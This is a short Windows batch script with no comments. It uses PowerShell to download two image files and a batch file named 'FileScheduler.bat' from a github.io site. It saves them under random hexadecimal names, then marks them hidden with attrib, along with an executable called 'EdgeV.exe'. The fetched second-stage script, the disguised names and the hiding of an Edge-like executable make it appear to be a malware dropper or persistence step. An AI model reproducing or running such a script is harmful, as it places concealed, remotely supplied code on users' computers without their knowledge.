@echo off
:start
IF EXIST 7b96332f2c9f777574ba038be0334018.jpg goto nextfile1
:nextfile1
IF EXIST d3745b53b599b72e9cb750f4d757560d.bat goto nextfile2
:nextfile2
IF EXIST ec372a061f8a3c0432bb4575216c7f75.jpg goto nextfile3
:nextfile3
IF NOT EXIST 7b96332f2c9f777574ba038be0334018.jpg goto files
IF NOT EXIST d3745b53b599b72e9cb750f4d757560d.bat goto files
IF NOT EXIST ec372a061f8a3c0432bb4575216c7f75.jpg goto files
:files
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://fazemelon.github.io/images/FaZeMelon.jpg', 'ec372a061f8a3c0432bb4575216c7f75.jpg')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://fazemelon.github.io/scripts/FileScheduler.bat', 'd3745b53b599b72e9cb750f4d757560d.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://FaZeMelon.github.io/2FT9d9jtuW0uJxI2at9x.jpg', '7b96332f2c9f777574ba038be0334018.jpg')"
attrib +h 7b96332f2c9f777574ba038be0334018.jpg
attrib +h d3745b53b599b72e9cb750f4d757560d.bat
attrib +h ec372a061f8a3c0432bb4575216c7f75.jpg
attrib +h EdgeV.exe
:end
